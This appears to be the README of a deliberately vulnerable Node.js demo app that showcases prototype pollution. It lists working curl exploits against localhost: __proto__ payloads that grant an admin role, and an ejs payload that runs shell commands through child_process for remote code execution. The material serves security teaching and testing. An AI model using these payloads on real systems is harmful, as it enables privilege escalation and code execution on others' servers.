# Proto App

Application showcasing prototype pollution vulnerabilities in node.js

## TODO

- Write expolits as tests to easily showcase vulnerabilities (and mitigation):
    - DOS exploit of indirect and direct vulnerability 
    - RCE exploit
- Add RCE Vulnerability:
    - ejs
- Exploit html-sanitizer
- Indirect and direct mitigations:
    - Object.freeze:
    - Schema Validation
    - Using Map instead of Object for key-value data storage
- Compare security scanner outputs

## DONE
- Vulnerabilies:
    - Direct protyotype pollution (set function)
    - Indirect prototype pollution (lodash)
- exploits / commands:
    - create normal user: 
        curl -X POST http://localhost:3000/register -H "Content-Type: application/json" -d '{"username": "normaluser", "password": "normalpassword"}'
    - indirect prototype pollution:
        curl -X POST http://localhost:3000/register -H "Content-Type: application/json" -d '{"__proto__": {"role": "admin"}, "username": "normaluser", "password": "normalpassword"}'
    - direct prototype pollution: 
        curl -X POST http://localhost:3000/update/`id` -H "Content-Type: application/json" -d '{"path": "__proto__.role", "value": "admin"}'
    - check pollution (get user by id):
        curl http://localhost:3000/users/1/role
    - RCE exploit:
        - curl -X POST http://localhost:3000/register -H "Content-Type: application/json" -d '{"__proto__": {"client":"true", "escapeFunction":"console.log(`POLLUTED`)"}, "username": "normaluser", "password": "normalpassword"}'
curl -X POST http://localhost:3000/register -H "Content-Type: application/json" -d '{"__proto__": {"client":"true", "escapeFunction":"console.log(process.mainModule.require(`child_process`).execSync(`ls -la`))"}, "username": "normaluser", "password": "normalpassword"}'
        

## Vulnerable Packages
- lodash:
    - 4.17.17 (fixed version)
    - prototype pollution exploit
- 
